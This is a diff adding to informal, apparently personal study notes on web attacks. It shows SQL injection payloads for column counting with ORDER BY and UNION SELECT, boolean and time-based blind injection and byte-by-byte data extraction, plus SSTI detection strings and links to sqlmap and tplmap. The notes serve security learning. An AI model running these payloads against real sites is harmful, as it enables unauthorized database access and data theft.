@@ -1,4 +1,9 @@
 # OWASP
+first of all have a look at [payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master) and save it for other uses.
+
+> [Orange](https://blog.orange.tw/) has good article to read.
+
+
 ## Command Injection
 ### Basics
 whenever we see a suspicious input, we fuzz it. we need to use command separators.
@@ -132,3 +137,133 @@ u can use various fliters. for examle in this query it retunrns only column name
 ```SQL
 SELECT group_concat(cloumn_name) FROM information.schema.columns WHERE table_schema='DATABASE_NAME' AND table_name='TABLE_NAME' 
 ```
+
+### UNION
+in MYSQL:
+- when using `ORDER BY` to order datas by a column name or number. *(if it doesnt exist it will raise an error)*
+- when using `UNION SELECT` the number of columns (and order of columns) must be same
+- `UNION SELECT` cant use after `ORDER BY`.
+
+a test that use `ORDER BY` vulnerablilty.
+```SQL
+Default request:
+page/?id=54
+
+
+Test 1:
+page/?id=54 ORDER BY 1
+page/?id=54' ORDER BY 1#
+page/?id=54" ORDER BY 1#
+
+
+Test 2:
+page/?id=54 ORDER BY 1000
+page/?id=54' ORDER BY 1000#
+page/?id=54" ORDER BY 1000#
+```
+
+we can confirm we have sql injection when:
+- Test 1 == Default
+- Test 2 != Test 1
+
+b/c it hard to be selected 1000 columns so it must raise error and two tests cant be same.
+
+suppose u dont know the first `SELECT` so in this case u must try to find that how many columns are selected.
+first look at this to get what i mean about first `SELECT`.
+> `SELECT * FROM TABLE_NAME WHERE id=54` the part `SELECT *` is first `SELECT`.
+
+so now u know what we talking about. so look at the tries for exploiting.
+```SQL
+page/?id=54 ORDER BY 1 # same as default request
+page/?id=54 ORDER BY 2 # same as default request
+page/?id=54 ORDER BY 3 # same as default request
+page/?id=54 ORDER BY 4 # not same as default request
+```
+so we get that the first `SELECT` select 3 column. in the end we exploit like this via `UNION SELECT`.
+```SQL
+page/?id=54 UNION SELECT 1,2,3#
+```
+
+> if u rn't allowed to use qoute(s), u can use HEX code only and only for strings.
+
+
+### Blind SQLi
+- boolean based -> *there is a processed result of data*:
+  - the attack released in `True` or `False` detection.
+  ```SQL
+    Default request:
+    page/?id=54
+
+
+    Test 1:
+    page/?id=54 and 1=1
+    page/?id=54' and '1'='1
+    page/?id=54" and "1"="1
+
+
+    Test 2:
+    page/?id=54 and 1=2
+    page/?id=54' and '1'='2
+    page/?id=54" and "1"="2
+  ```
+  - we can confirm sqli when:
+    - Test 1 == Default request
+    - Test 2 != Test 1
+- time bases bline -> *there is no data*:
+    - the attack release by time sleeping of HTTP request:
+    ```SQL
+    page/?id=54 and sleep(10)
+    page/?id=54' and sleep(10)#
+    page/?id=54" and sleep(10)#
+    ```
+
+> sometimes mostly when u seeing a search box query isnt like this `keyword = $INPUT` its like this `keyword like '%INPUT%'` b/c in search we dont wanna exact word. so in this case we need to change our injection to this: `test%' and 1=1#`
+
+for exploiting data:
+- sepcify two conditions, a `True` one and a `False` one.
+- use sth like `IF` to extract data.
+- u cant extract whole data so do it byte by byte
+lets make an example:
+```SQL
+page/?id=54 and 1=1 # True one
+page/?id=54 and 1=2 # Flase one
+page/?id=54 and 1=IF(2>1,1,0) # True one
+page/?id=54 and 1=IF(1>2,1,0) # Flase one
+```
+lets extract databse name length:
+```SQL
+page/?id=54 and 1=IF((SELECT LENGTH(DATABASE()))>1,1,2)-- - # True one
+page/?id=54 and 1=IF((SELECT LENGTH(DATABASE()))>2,1,2)-- - # True one
+page/?id=54 and 1=IF((SELECT LENGTH(DATABASE()))>3,1,2)-- - # True one
+page/?id=54 and 1=IF((SELECT LENGTH(DATABASE()))>4,1,2)-- - # True one
+page/?id=54 and 1=IF((SELECT LENGTH(DATABASE()))>5,1,2)-- - # True one
+page/?id=54 and 1=IF((SELECT LENGTH(DATABASE()))>6,1,2)-- - # False one
+```
+so database name length is 6.
+
+### SQLmap
+it use for detecting and exploiting sqli.
+
+[here](https://github.com/sqlmapproject/sqlmap) is github repository of it.
+
+## SSTI (Server-Side Template Injection)
+u can inject malicious code in web app template.
+
+in ssti:
+- dynamic content pass to template.
+- so user can inject code
+- the flow is like this: detect -> identify template engine -> exploit
+- detection payload is:
+  ```code
+  {{7*7}}
+  ${7*7}
+  <%= 7*7%>
+  ${{7*7}}
+  #{7*7}
+  ${{<%[%'"}}%\
+  ```
+
+  ### Tplmap
+  is sth like sqlmap :)
+  
+  [here](https://github.com/epinna/tplmap?tab=readme-ov-file) is github repository of it.
